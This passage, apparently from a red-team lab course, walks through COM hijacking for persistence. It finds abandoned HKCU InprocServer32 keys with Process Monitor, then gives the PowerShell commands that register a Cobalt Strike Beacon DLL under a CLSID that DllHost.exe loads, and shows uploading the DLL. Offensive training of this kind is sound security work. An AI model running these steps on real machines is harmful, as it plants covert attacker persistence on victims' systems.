Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).

[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is part of the excellent [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives. Launch **procmon64.exe** on **Attacker Windows**.

Due to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:

-   **RegOpenKey** operations.
-   where the _Result_ is **NAME NOT FOUND**.
-   and the _Path_ ends with **InprocServer32**.

To speed the collection up you click random things, go into the Windows menu, launch applications etc. After just a few minutes, I have over 5,000 events - most of them from Explorer, some from 3rd party software and others from OS components.

One aspect to look out for is the number of times a particular CLSID is loaded. If you hijack one that is loaded every couple of seconds you're going to have a rough time - so it's well worth the additional effort to find one that's loaded semi-frequently but not so much so, or loaded when a commonly-used application (Word, Excel, Outlook etc) is opened.

Scrolling through, I picked out this CLSID being loaded by **C:\\Windows\\system32\\DllHost.exe**

```
HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
```

We can use some quick PowerShell to show that the entry does exist in HKLM, but not in HKCU.

```powershell
PS C:\> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment


PS C:\> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.
```

To exploit this, we can create the necessary registry entries in HKCU and point them at a Beacon DLL.

```powershell
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

To generate the DLL, go to **Attacks > Packages > Windows Executable (S)** and select **Windows DLL** as the output type. Then upload the DLL to the location we specified in the registry entry above.
```shell
beacon> cd C:\
beacon> upload C:\Payloads\beacon.dll
```

When **DllHost.exe** loads this COM entry, we get a Beacon.
